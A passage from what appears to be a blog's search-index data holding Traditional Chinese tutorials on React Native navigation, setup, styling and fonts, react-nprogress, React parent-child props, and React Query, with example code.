contentContainerStyle 當你想對 FlatList 自己做樣式設定時，一定會用到這個","link":"/2022/05/30/react-native-list/"},{"title":"React Navigation－Navigation Stack","text":"原來這就是「刷過去」的效果。 置頂說明後來我發現原來 Stack 有分兩種： Stack Navigator Native Stack Navigator 簡單來說一個是用 JS 去寫的，可以客製化的程度比較高，但可能也會有比較多 bug。後者的話則是用原生的 navigation，所以限制會變多，但 bug 會少一點。 這篇文章用的是 Native 的 Stack，不過大致上沒什麼問題，還是可以參考看看。 自我檢測 我知道什麼是 Navigation Stack 我知道什麼是 Drawer navigation 我知道怎麼用 Navigate 來切換 screen 我知道怎麼在 Screen 之間傳遞與接收 props 簡介首先要特別講一下，在 App 裡面的導覽跟 Web 裡的導覽思路是不同的。 我們在 Web 中可以透過「URL」來判斷目前要顯示哪個元件，這很合理沒有問題，但 App 呢？仔細想想看一件事情： App 有 URL 這玩意兒嗎？ 當然沒有。 所以這邊就要介紹一下 App 的導覽思路。 首先核心觀念是「Stack Navigate」，還有一個叫做「Drawer navigation」的觀念，也是蠻重要的，但這之後才會介紹，這一篇還不會提到。總之，值得關注的是 Stack 這個關鍵字（是一種資料型態）。 簡單來說，假設我們有 Home 頁面跟 Another 頁面，那當我們第一次進入 App 時，我們的 Stack Navigate 就會長這樣： 接著當我們進入到 Another 頁面時，就會把他「疊上去 Stack」，變成這樣： 所以現在 Home 還是放在那邊，只是我們用 Another 把他蓋住了而已。 接著當我們再去下一個 Another 頁面時，就會變成這樣： 好，接著我們想回到 Home 頁面的話怎麼做？如果你知道 Stack 的運作的話（不懂的話可以複習 資料結構－Stack 與 Queue），就會知道我們要： 把第一個 Another pop 掉 把第二個 Another pop 掉 回到 Home 頁面 這個就是在 App 裡實作導覽的方式，我覺得還蠻特別的，不知道你怎麼想？ 需要的套件這邊會用 React Navigation 來做示範，詳細可以參考 官方文件 主要會裝的套件有這幾個： @react-navigation/native (npm) @react-navigation/native-stack (npm) react-native-screens (expo) react-native-safe-area-context (expo) 用法基本頁面這邊為了方便閱讀我就全部寫一起了，程式碼也不多： 12345678910111213141516171819import Detail from './screens/Detail';import About from './screens/About';import Home from './screens/Home';import { NavigationContainer } from \"@react-navigation/native\";import { createNativeStackNavigator } from \"@react-navigation/native-stack\";const Stack = createNativeStackNavigator();export default function App() { return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator&gt; &lt;Stack.Screen name='Home' component={Home} options={{ title: 'PeaNu' }} /&gt; &lt;Stack.Screen name='About' component={About} /&gt; &lt;Stack.Screen name='Detail' component={Detail} /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );} 看起來有一種 React-router-dom 的既視感吧？總之重點有兩個地方： NavigationContainer 負責包住所有 Screnn，就跟 React-router-dom 裡的 HashRouter 是差不多的概念 createNativeStackNavigator 建立 Stack，所有 Screnn 都會疊在這裡面 他的機制是這樣，在 Stack.Navigator 裡面的第一個 Screen 會被放入 Navigation Stack，以上面來說的話就是 Home 這個頁面。 這個頁面會是我們進入 App 時的「預設頁面」，如果要用圖來表示目前的 Navigation Stack 的話，會像這樣： 假設進來後，我們又進入到 Detail 的話就會變這樣： 這個就是他背後運作的方式，也是前面介紹的 Navigation Stack 的運作流程。 切換到其他頁面這邊只要知道一件事就夠了，官方文件中有提到： Each screen component in your app is provided with the navigation prop automatically. 附註：想知道有哪些相關的 API 可以到 這邊 來看。 意思就是我們放在 Stack 裡面的頁面都會自動被傳入 navigation 這個 props，所以只要拿進來用就好了： 1234567891011121314151617181920import { View, Text, Button } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";type HomeProps = { navigation: any}// 接收到 propsconst Home: React.FC&lt;HomeProps&gt; = ({ navigation }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Text style={globalStyles.titleText}&gt;Home screen&lt;/Text&gt; {/* 加上一個跳轉的按鈕 */} &lt;Button title=\"Go to Detail\" onPress={() =&gt; navigation.navigate('Detail')} /&gt; &lt;/View&gt; )}export default Home; 附註：其實寫成 navigation.push('Detaik') 也行，不過比較少人這樣寫就是了。 只要這樣子做，我們就有一個可以跳轉的按鈕了： 當我們按下按鈕後，就會跳轉到我們指定的頁面（會對應到 name）： 這邊的 &lt;（返回按鈕）是自動產生的，如果你也想要自製一個類似的按鈕，可以用 navigation.goBack() 的方式來實作。 在不同的 Screen 之間傳遞 props這應該是個很常見的需求，假設我有 Home 跟 Detail 兩個頁面，Home 負責顯示列表的標題，Detail 顯示列表的內容，那我該怎麼把放在 Home 這邊的資料傳給 Detail 來顯示？ 首先，navigation.navigate() 是有第二個參數的，這個參數就是用來讓我們傳遞 props 的，所以 Home 就可以這樣子寫： 1234567891011121314151617181920212223242526272829303132333435363738394041import { useState } from \"react\";import { View, FlatList, TouchableOpacity, Text } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";interface Reviews { name: string, body: string, rating: number, key: string}type HomeProps = { navigation: any}const Home: React.FC&lt;HomeProps&gt; = ({ navigation }) =&gt; { const [reviews, setReviews] = useState&lt;Reviews[]&gt;([ { name: 'Zelda, Breath of Fresh Air', rating: 5, body: 'lorem ipsum', key: '1' }, { name: 'Gotta Catch Them All (again)', rating: 4, body: 'lorem ipsum', key: '2' }, { name: 'Not so \"Final\" Fantasy', rating: 3, body: 'lorem ipsum', key: '3' }, ]) return ( &lt;View style={globalStyles.container}&gt; &lt;FlatList contentContainerStyle={{ paddingVertical: 20, justifyContent: 'center', alignItems: 'center' }} data={reviews} renderItem={({ item }) =&gt; ( // 把要傳的 props 放在第二個參數 &lt;TouchableOpacity onPress={() =&gt; navigation.navigate('Detail', item)}&gt; &lt;Text&gt;{item.name}&lt;/Text&gt; &lt;/TouchableOpacity&gt; )} /&gt; &lt;/View&gt; )}export default Home; 這樣就成功傳進去了，接下來的第二個問題是：要怎麼接收？ 這時候 Detail 裡會自動接收到一個 props，叫做 route，所以可以這樣取得： 123456789101112131415161718192021import { View, Text } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";type DetailProps = { route: any}const Detail: React.FC&lt;DetailProps&gt; = ({ route }) =&gt; { // route.params 就是從 Home 傳進去的 item，只是用解構拿出來而已 const { name, body, rating } = route.params return ( &lt;View style={globalStyles.container}&gt; &lt;Text&gt;{name}&lt;/Text&gt; &lt;Text&gt;{body}&lt;/Text&gt; &lt;Text&gt;{rating}&lt;/Text&gt; &lt;/View&gt; )}export default Detail; 在 Title 顯示 props 傳進來的參數只是想特別寫一下，這功能應該蠻常用到的。 附註：有需要的話可以參考官方文件。 12345678910111213141516171819202122232425262728const HomeStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerStyle: { backgroundColor: '#eee' }, headerTintColor: '#333', }} &gt; &lt;Stack.Screen name='Home' component={Home} options={{ title: 'GameZone', }} /&gt; &lt;Stack.Screen name='Detail' component={Detail} // 重點是這一行 options={({ route }: any) =&gt; ({ title: route.params.name }) } /&gt; &lt;/Stack.Navigator&gt; )} export default HomeStack; 設定 navbar 的樣式如果想改變預設的樣式，可以用 options 或 screenOptions 這個 props 來更新： 12345678910111213141516171819202122232425262728export default function App() { return ( &lt;NavigationContainer&gt; {/* 寫在這邊就是 global style */} &lt;Stack.Navigator screenOptions={{ headerStyle: { backgroundColor: '#eee' } }} &gt; {/* local style */} &lt;Stack.Screen name='Home' component={Home} options={{ title: 'GameZone', headerTintColor: '#333', }} /&gt; &lt;Stack.Screen name='Detail' component={Detail} options={{ headerBackTitleStyle: { fontSize: 20 } }}/&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );} 想知道有哪些東西可以調的話，可以參考這裡","link":"/2022/05/28/react-native-navigation-stack/"},{"title":"初探 React Native 與環境建置","text":"幫自己挖一個新的坑。 自我檢測 我知道 React Native 跟 React 的差別 我知道怎麼建立 React Native 的開發環境 我知道怎麼操作 Android 和 IOS 的虛擬機 我知道 Expo 跟 React CLI 的差別是什麼 我知道 React Native 其實就是在寫 Native（且知道原理） 什麼是 React Native跟 React 一樣是個從 Facebook 開源出來的框架，但 React 是針對「Web」，React Native 則是針對「App」為主。 簡單來說，React Native 就是讓你用「很像在寫 React」的方式來寫 App，只要你對 React 有一定程度的理解，要上手這個東西就不需要很大的學習成本。 Expo 與 React Native CLI在建立 React Native 的開發環境時，會面臨兩個選擇： React Native CLI Expo CLI 這兩者最大的差別在於「前者會需要碰原生的 Code，而後者只有純粹的 JavaScript」。 所以優劣勢也很明顯，碰原生的 Code 意味者你能做更多的事情（畢竟是直接用原生來寫），像是直接跟 Native API 溝通之類的，但如果是 Expo 這種幫你包裝好的框架，你只能用它提供給你的東西來做事情，所以就會被侷限在一個範圍內。 如果妳是像我這種第一次入門的人，可以先選擇 Expo 來當作練習。等之後摸熟後想做更多事情時，再跳去 React Native CLI 應該也是 OK 的。 環境建置安裝 Expo：1sudo npm install -g expo-cli 安裝 Android Studio（虛擬機）官方載點 安裝完以後，首先確認「SDK Platforms」和「SDK Tools」是否有安裝正確： 打開 Android Studio 選擇首頁下方的「More Actions」，點選「SDK Manager」 SDK Platforms 應該會顯示最新版本的 API 項目被打勾，SDK Tools 則會顯示「Android Emulator」、「Android SDK Platform-Tools」和「Inter x86 Emulator Accelerator」被打勾。 如果有沒打勾的部分，就把他勾起來重新安裝就好。 接下來是 Mac 的部分要再設定環境變數，這部分請直接參考 Expo 官方文件，基本上只要複製貼上就好了。 接著要來建立「虛擬機」，這時會要你選擇「機種」跟「作業系統」。如果沒特別偏好的話，基本上選新的版本跟機型就好，不要在這邊選擇障礙太久！ 安裝 Xcode（虛擬機）去 App stote 下載，打開 Xcode 後設定 preferences：location &gt; Command Line Tools 選取最新的 Xcode 版本。 接著就可以打開模擬器了：Open Developer Tool &gt; Simulator 如果要改機型的話，切到虛擬機的視窗：File open simulator 就有跳出很多選項了。 在虛擬機上打開 developer menu 的方法 Command + M 可以在 Andriod 打開 Devtool Command + D 可以在 IOS 打開 Devtool 實體手機的話請「搖晃幾下」，他就會自己彈出來了。 推薦裝的 vs code 套件只是個補充，如果你有需要的話可以參考以下幾個： React Native Tools React Native/React/Redux Snippet 開啟專案以上都建立好以後，只要透過 Terminal 執行： 1npm start # expo start 就會跳出 expo 的訊息跟主控台，裡面告訴你要怎麼跟 Android 和 IOS 做連結，照著做就沒問題了。 順道一提，如果你是用「實體手機」來跟專案做連結的話，請務必記得先安裝 Expo Go，並確保手機跟電腦「連的是同一個網路」，不然的話就會失敗。（這個跟內網 / 外網的概念有關） 以上就是基本的環境建置，希望接下來的時間我可以跟 React Native 慢慢混熟 ~ 參考資源 React Native Tutorial for Beginners - Build a React Native App React Native Tutorial #2 - Creating a React Native App","link":"/2022/05/25/react-native-set-up/"},{"title":"React Native 中的 style 和 layout","text":"好久不見的 style。 自我檢測 我知道怎麼在 APP 中加入 Icon 我知道怎麼在 APP 中使用客製化 Font 我知道怎麼利用 module 把 Stylesheet 抽出去變成全域樣式 我知道什麼是 View、Text、Button 等等基本的 RN 元件 我知道怎麼用 RN 中的 StyleSheet、Flex 和 Position 來做排版 我知道 RN 裡面不會寫 px 值，而是要透過 scale factor 來計算結果 我知道怎麼透過 AppLoading 來處理第一次載入時的處理 block / inline在 RN 裡面沒有所謂的 block / inline，所以你可以把所有東西都視為 block。 不過更精確一點來說是只有「Flex」，因為每一個 Component 預設就是 Flex-box，所以你才會看到像這樣的寫法： 12345678910111213export default function App () { return ( &lt;View style={styles.container}&gt; &lt;Text&gt;Flex item&lt;/Text&gt; &lt;/View&gt; )}const styles = StyleSheet.create({ container: { flex: 1, // 直接用 flex 的屬性 }}) Styles想要在 RN 做樣式設定的話，可以用 style 這個 props 傳入「物件」來設定樣式： 123456789101112131415import { StyleSheet, Text, View } from 'react-native';export default function App() { return ( &lt;View style={styles.container}&gt; &lt;Text&gt;Some thing else.&lt;/Text&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff',}); 這邊透過 StyleSheet.create() 的用意是「如果用了不對的 key / value 時」，會直接噴 Error 並停止程式。 但其實只傳入一般的純物件也是 OK 的，像這樣： 123456789101112import { StyleSheet, Text, View } from 'react-native';export default function App() { return ( &lt;View style={{ flex: 1, backgroundColor: '#fff' }}&gt; &lt;Text&gt;Some thing else.&lt;/Text&gt; &lt;/View&gt; );} 這樣有什麼差嗎？ 有哦！在只傳入物件的情況下，如果我寫了不對的 key / value 是不會噴錯誤的。但如果是透過 StyleSheet.create() 來建立的物件，只要我有地方寫錯他就一定會編譯失敗並顯示錯誤。 所以一般會建議用 StyleSheet.create() 的方式來撰寫，但如果你真的很懶的話用純物件的方式也不是不行啦。 RN 裡沒有繼承的概念在經過 CSS 多年的摧殘下，如果我想讓文字粗體，可能會下意識這樣寫： 1234567891011121314151617181920212223export default function App() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.header}&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff', padding: 30, }, header: { backgroundColor: 'pink', fontWeight: 'bold' }}); 但這樣是沒用的，我一定要把這個 fontWeight 寫在 &lt;Text&gt; 身上才有用。 雖然有個例外情形，就是 &lt;Text&gt; 裡面再放一個 &lt;Text&gt;，像這樣： 1234567891011121314151617181920212223export default function App() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.header}&gt; &lt;Text style={styles.parentText}&gt;Parent Text And&lt;Text&gt;Child Text&lt;/Text&gt;&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff', padding: 30, }, header: { backgroundColor: 'pink', }, parentText: { fontWeight: 'bold' }}); 這樣的話 Child Text 就也會吃到粗體的效果。 但這只是例外情形，你要知道大多數情形下還是不會有「繼承」的觀念的。 現在 &lt;View&gt; 就等於 flex-box，&lt;Text&gt; 就等於 flex-item，總之要知道這個在 RN 裡面最基本的運作模式。 關於尺寸的單位因為要考慮「Scale Factor」的關係，所以實際的寬可能跟你想得不一樣。 參考這張圖： 一個 iPhone4 的像素是 320 x 480，但 Scale Factor 是「2x」，所以實際的解析度是 640 x 960（乘以二）。 所以我如果把藍色方塊的寬度設為 150，實際在手機上就會是 300px。 總之這邊是要讓你搞清楚妳設定的「值」代表什麼？ 如果 Scale factor 為 2，則每個單位就代表 2px 如果 Scale factor 為 3，則每個單位就代表 3px 知道這些就好了，不用特別去背這些規格。如果真的碰到單位的問題，可以試著用 % 的方式來設值。 Flex在 RN 裡面主要會用 Flex 的方式來排版（也是預設的排版方式），主要概念都跟 CSS 裡的 Flex box 差不多，所以這邊只會把我覺得幾個比較特別或需要瞭解的觀念給記錄下來。 複習幾個 flex 相關屬性 flexBasis 設定相對於「主軸」的寬度，會覆蓋掉 width 的設定 flexGrou 根據「主軸」的剩餘空間來分配 ??? 到這個 item flexShrink 根據「主軸」的溢出空間來壓縮 ??? 到這個 item justifyContent 設定 item 的對齊方式（根據主軸） alignItems 設定 item 的對齊方式（根據次軸） flex: 1 這個其實是在說flexGrow: 1 的意思，只是個簡寫 附註一下 RN 跟 CSS 不同的幾個地方： flexDirection 的預設值是 column flexShrink 的預設值是 0 Direction在 React Native 中，如果這樣設定： 12345678910111213141516171819202122232425export default function App() { return ( &lt;View style={{ flex: 1, backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;/View&gt; );} 最後出來的東西會是三個「直向排列」的 item，跟你在寫 CSS 的時候還蠻不一樣的對吧？如果是 CSS 的話預設會是「橫向排列」。 簡單來說，這是因為在 RN 裡面 Flex 預設的方向是 column 而不是 row 的關係。 仔細想想的話也蠻合理的，畢竟我們在用手機的時後大多是以「直向」為主，所以把 Flex 預設成直向好像也挺直覺的！ alignContent這個只會在有 flewWrap: wrap 的時候才有作用，記得這個就好了，舉例來說： 1234567891011121314151617181920212223242526272829303132333435363738394041424344export default function App() { return ( &lt;View style={{ flex: 1, flexDirection: 'row', justifyContent: 'center', flexWrap: 'wrap', // 換行 alignContent: 'center', backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'pink' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'black' }} /&gt; &lt;/View&gt; );} 這時候的結果是長這樣： 但如果把 alignContent 拿掉的話就會變這樣： 簡單來說，如果你的 flex-box 有啟用「換行」，然後你又想「把裡面的 flex-item 全部放到正中央」，那就會需要 alignContent 而不是 alignItems。 alignItems 是用來處理「沒有換行」的時候才會用的屬性。 Position在 RN 裡面 Position 的預設值是 relative，所以我可以直接這樣寫： 1234567891011121314151617181920212223242526272829export default function App() { return ( &lt;View style={{ flex: 1, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ top: 20, // 直接用 top 來偏移 width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;/View&gt; );} 輸出結果： 用法其實都跟 CSS 一樣，所以就不特別介紹怎麼用了。這邊只是想特別提一下預設值是 relative 這一點。 至於 absolute 的話也跟 CSS 一樣，記得加上 position: 'absolute' 來打開，然後判斷好「父層的參考點」就好了。 順道一提，在 RN 裡面 position 就只有這兩種而已，不會有什麼 fixed 或 sticky 跟 static 這種東西。 載入 FontFOIT 跟 FOUT 是什麼？附註：如果你想看範例的話可以到 這邊 這邊科普一下兩個載入字體的使用手法： FOIT 先隱藏所有文字內容，等載入完成後才顯示（但其他的東西一開始會被顯示） FOUT 先顯示預設字型，等載入後再更新成新的字型 簡單來說就是不同的設計哲學而已，還蠻有趣的。 第一種做法（hook）這種作法是透過 hook 來做的，簡單來說就是： 先下載字型的 package，@expo-google-fonts/{googleFont} 接著用下面的方式來使用即可 附註：假設 &lt;Home /&gt; 裡面有用到我們指定的字型。 123456789101112131415161718import AppLoading from 'expo-app-loading';import Home from './screens/Home';import { useFonts, Nunito_400Regular, Nunito_700Bold } from \"@expo-google-fonts/nunito\";export default function App() { let [fontsLoaded] = useFonts({ Nunito_400Regular, Nunito_700Bold }) if (!fontsLoaded) { return &lt;AppLoading /&gt; } return ( &lt;Home /&gt; );} useFonts 會回傳一個陣列，陣列的第一個值是 boolean，代表這字型載入完了沒？ 接著下面寫了一個 if 判斷，意思就是如果還在載入就顯示 &lt;AppLoading /&gt;，等到載入完以後才顯示 &lt;Home /&gt;。 雖然還蠻好奇他是怎麼更新 fontsLoaded 這個 state 然後觸發 re-render 的，不過這確實是可行的！也是最簡潔的做法。 第二種做法（Font.loadAsync）這應該算是比較舊的做法，不過也是能參考一下： 附註：Font.loadAsync 也可以載入外部資源，只要把 require 改成對應的 URI 就行了 1234567891011121314151617181920212223242526272829import AppLoading from 'expo-app-loading';import Home from './screens/Home';import { useState } from 'react';import * as Font from \"expo-font\";export default function App() { const [fontsLoaded, setFontsLoaded] = useState&lt;boolean&gt;(false); const getFonts = () =&gt; { return Font.loadAsync({ 'Nunito_400Regular': require('./assets/fonts/Nunito-Regular.ttf'), 'Nunito_700Bold': require('./assets/fonts/Nunito-Bold.ttf'), }); } if (!fontsLoaded) { return ( &lt;AppLoading startAsync={getFonts} onFinish={() =&gt; setFontsLoaded(true)} onError={(error) =&gt; console.log('error', error)} /&gt; ) } return ( &lt;Home /&gt; );} 跟第一種作法差不多，只是 state 跟 call function 的部分得自己來： getFonts 用來載入字型的 function &lt;AppLoading startAsync={getFonts}&gt; 去 call 載入字型的 function &lt;AppLoading onFinish={() =&gt; setFontsLoaded(true)}&gt; 載入完成後更新 state 設定 Icon附註：官方文件（可查詢 icon 名稱） 關於 Icon 的部分，在我們用 expo init 專案的時候其實就會順便載入相關的套件了，所以我們只要直接 import 進來用就可以了，像這樣： 1234567import { MaterialIcons } from '@expo/vector-icons';export default function TodoList({ todos, removeTodo }) { return ( &lt;MaterialIcons name=\"delete\" size={24} color=\"#333\" /&gt; )}","link":"/2022/05/27/react-native-style-and-layout/"},{"title":"react-nprogress 懶人包","text":"很 fancy 的效果。 簡述這是最近碰到的一個套件，因為覺得還不錯用所以順便記錄一下。 想知道更多細節可以到 官方文件 來看，我覺得寫得很不錯，推一個！ 用法1. 建立 CSS 動畫因為「轉圈圈」的元件是透過 CSS 動畫來實作的，所以要記得開一支 CSS 來寫入以下內容： 12345678@keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }} 2. 建立所需的元件簡單來說我們要建立一個 Progress 元件，這個元件中還會包含其他元件，分別為 Bar、Container 和 Spinner，不太懂的話直接 code 吧： 12345678910111213141516171819202122232425import { useNProgress } from '@tanem/react-nprogress'import Bar from './Bar'import Container from './Container'import Spinner from './Spinner'export default function Progress({ animationDuration, incrementDuration, isAnimating, minimum }) { // 套件提供的 hook // isFinished = 是否顯示進度條 // progress = 進度條當下的長度 const { isFinished, progress } = useNProgress({ animationDuration, incrementDuration, isAnimating, minimum }) // 最後回傳 template return ( &lt;Container animationDuration={animationDuration} isFinished={isFinished}&gt; &lt;Bar animationDuration={animationDuration} progress={progress} /&gt; &lt;Spinner /&gt; &lt;/Container&gt; )} 簡單來說就是把 Progress 接收的 props 傳給 useNProgress（當作 confi），然後再把對應的 state 放到 template 上就行了。 至於 template 的內容我一併附上： Container.jsx 123456789101112131415import React from 'react'const Container = ({ animationDuration, children, isFinished }) =&gt; ( &lt;div style={{ opacity: isFinished ? 0 : 1, pointerEvents: 'none', transition: `opacity ${animationDuration}ms linear` }} &gt; {children} &lt;/div&gt;)export default Container Bar.jsx 123456789101112131415161718192021222324252627282930const Bar = ({ animationDuration, progress }) =&gt; ( &lt;div style={{ background: '#29d', height: 2, left: 0, marginLeft: `${(-1 + progress) * 100}%`, position: 'fixed', top: 0, transition: `margin-left ${animationDuration}ms linear`, width: '100%', zIndex: 1031 }} &gt; &lt;div style={{ boxShadow: '0 0 10px #29d, 0 0 5px #29d', display: 'block', height: '100%', opacity: 1, position: 'absolute', right: 0, transform: 'rotate(3deg) translate(0px, -4px)', width: 100 }} /&gt; &lt;/div&gt;)export default Bar Spinner.jsx 123456789101112131415161718192021222324252627import React from 'react'const Spinner = () =&gt; ( &lt;div style={{ display: 'block', position: 'fixed', right: 15, top: 15, zIndex: 1031 }} &gt; &lt;div style={{ animation: '400ms linear infinite spinner', borderBottom: '2px solid transparent', borderLeft: '2px solid #29d', borderRadius: '50%', borderRight: '2px solid transparent', borderTop: '2px solid #29d', boxSizing: 'border-box', height: 18, width: 18 }} /&gt; &lt;/div&gt;) 3. 拿來用（結束）12345678910111213141516171819202122import './Home.css'import React from 'react'import { useFetch } from 'hooks/useFetch'import RecipeList from 'components/RecipeList'import Progress, { progressProps } from 'components/Progress'export default function Home() { const { data, isPending, error } = useFetch('http://localhost:3000/recipes') return ( &lt;div className='home'&gt; &lt;Progress isAnimating={isPending} animationDuration={progressProps.animationDuration} incrementDuration={progressProps.incrementDuration} minimum={0} /&gt; {isPending &amp;&amp; &lt;div className='loading'&gt;Loading...&lt;/div&gt;} {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} {data &amp;&amp; &lt;RecipeList recipes={data} /&gt;} &lt;/div&gt; )} 只要把 Ajax 的 loading 狀態當作 props 傳入就大功告成囉～ 補充：每個 props 的用途 isAnimating: boolean 是否顯示進度條 animationDuration: number 從開始到結束的時間 (ms) incrementDuration: number 進度條遞增的間隔時間（ms） minimum: number 進度條的起始點（0~1）","link":"/2022/06/18/react-nprogress/"},{"title":"React 父子元件間的溝通","text":"感覺在每個框架都得學的觀念。 簡述這邊會拿我做的垃圾 Todo list 來當範例： 它的結構長這樣： 123456789101112131415161718192021222324252627function App() { const [todos, setTodos] = useState([ { id: 0, content: '吃飯', isDone: true }, { id: 1, content: '寫文章', isDone: false }, { id: 2, content: '寫程式', isDone: false }, ]) return ( &lt;div style={rootStyle}&gt; &lt;TodoHeader addTodo={addTodo}&gt;&lt;/TodoHeader&gt; {todos.map(todo =&gt; &lt;TodoItem key={todo.id} todo={todo}&lt;/TodoItem&gt;)} &lt;/div&gt; );} 如果懶得看 code 的話，那就參考下面： App TodoHeader（上面的輸入區塊） TodoItem（下面的 Todo 列表） 現在的問題是，「如果 Todo 的狀態是儲存在 App 上，那我按下刪除按鈕時要怎麼去改到 App 的 State？」 其實解法還蠻直覺的，只是要稍微想一下就是了。 既然我們可以透過 props 把東西傳到子元件上，那我直接傳一個 function 不就好了嗎？ 像是這樣： 12345678910111213141516171819202122232425262728293031323334function App() { const [todos, setTodos] = useState([ { id: 0, content: '吃飯', isDone: true }, { id: 1, content: '寫文章', isDone: false }, { id: 2, content: '寫程式', isDone: false }, ]) // 用來變更 state 的 function // 預期會傳入一個 id const handleRemoveTodo = id =&gt; { setTodos(todos.filter(todo =&gt; todo.id !== id)) } return ( &lt;div style={rootStyle}&gt; // 透過 props 傳給子層 &lt;TodoHeader handleRemoveTodo={handleRemoveTodo}&gt;&lt;/TodoHeader&gt; {todos.map(todo =&gt; &lt;TodoItem key={todo.id} todo={todo}&lt;/TodoItem&gt;)} &lt;/div&gt; );} 接著就可以在子層接到這個 props： 1234567891011121314151617181920212223// 接收 propsfunction TodoItem ({ todo, handleRemoveTodo }) { // 按下按鈕的 handler const handleButtonClick = () =&gt; { // 去 call 父層傳進來的 function，並帶入 id handleRemoveTodo(Number(e.target.getAttribute('data-id'))) } return ( &lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{todo.content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;GreenButton isDone={todo.isDone} data-id={todo.id} onClick={handleButtonClick}&gt;{todo.isDone ? '已完成' : '未完成'} &lt;/GreenButton&gt; &lt;RedButton data-id={todo.id}&gt;刪除&lt;/RedButton&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )} 如此一來，就可以從子層去改變父層的 state，這就是元件之間的溝通方式，透過 props。","link":"/2022/04/06/react-parent-and-child-communication/"},{"title":"讓 API 打得更順手－React Query","text":"希望有機會的話能實際用用看。 置頂 Note相關的狀態 isLoading 是否拿到 response 了（注意，如果有快取的話就算正在抓也會是 false） isFetching 是否拿到 response 了（不會管有沒有快取） 懶人包：如果你不管有沒有 cache 都要顯示 Loading 的話，請一律用 isFetching 來當作你的 flag，isLoading 的本意只是為了讓你利用 cache 來減少等待 Loading 的次數。 Global Config有些 config 的預設值可能不是我們要的，這時候我們除了在每一次使用 useQuery 的時候去調整以外，也可以直接在 Global 做設定。 設定的方法如下： 12345678910111213function App() { // global 設定 const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false, refetchOnWindowFocus: false } } }) return &lt;QueryClientProvider client={queryClient}&gt;{/* 略 */}&lt;/QueryClientProvider&gt;} useQuery 最基本的用法基本上你要打 GET 請求的話都會用這個 hook。（如果是需要用 POST 帶參數來拿的那種也行啦） useQuery 會接收三個參數： key 用來區分每一個請求（一個的話傳字串，多個的話傳陣列） fetcher 你要 call api 的那個 function（會回傳一個 Promise 的那種） config 用來調整配置的物件 12345678910111213141516171819202122232425import axios from 'axios'import { useQuery } from 'react-query'const getHeros = () =&gt; axios.get('http://localhost:4000/superheroes1')export const RQSuperHeroesPage = () =&gt; { const { isLoading, data, isError, error } = useQuery('super-hero', getHeros) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (isError) { return &lt;h2&gt;{error.message}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;RQ Super Heros Page&lt;/h2&gt; {data?.data.map((hero) =&gt; ( &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; ))} &lt;/&gt; )} 這個 hook 會回傳一些常用的狀態，包含 isLoading、isError 等等，你直接拿出來用就可以了，很方便。 useMutation 最基本的用法只要是會修改到 Sever 資料的請求，像是 POST、DELETE 等等你都需要用這一個 hook。（畢竟都用「mutation」這個字了，就代表你想「改變」某些東西） useMutation 會接收兩個參數： fetcher 你要 call api 的那個 function config 用來調整配置的 下面是一個簡單的示範： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import { Link, useHistory } from 'react-router-dom/cjs/react-router-dom.min'import { useMutation, useQuery } from 'react-query'import axios from 'axios'import { useState } from 'react'const addHero = (payload) =&gt; axios.post('http://localhost:4000/superheroes', payload)export const RQSuperHeroesPage = () =&gt; { // 使用 useMutation const postQuery = useMutation(addHero) const [formValue, setFormValue] = useState({ name: '', alterEgo: '' }) const handleChange = (type, value) =&gt; { switch (type) { case 'name': setFormValue((oldState) =&gt; ({ ...oldState, name: value })) break case 'alterEgo': setFormValue((oldState) =&gt; ({ ...oldState, alterEgo: value })) break default: break } } const handleAddButton = () =&gt; { // 用 .mutate 來發出請求。這裡傳的東西會自動傳入 addHero postQuery.mutate(formValue) } return ( &lt;div&gt; &lt;input type='text' value={formValue.name} onChange={(event) =&gt; handleChange('name', event.target.value)} /&gt; &lt;input type='text' value={formValue.alterEgo} onChange={(event) =&gt; handleChange('alterEgo', event.target.value)} /&gt; &lt;button onClick={handleAddButton}&gt;Add&lt;/button&gt; 